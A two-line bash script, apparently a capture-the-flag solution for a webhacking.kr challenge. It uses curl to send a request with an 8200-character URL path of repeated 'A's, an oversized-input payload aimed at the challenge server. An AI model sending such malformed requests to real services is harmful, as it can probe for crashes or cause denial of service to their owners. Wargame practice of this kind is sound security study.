#!/bin/bash

curl "http://webhacking.kr:10022/$(python3 -c 'print("A"*8200)')"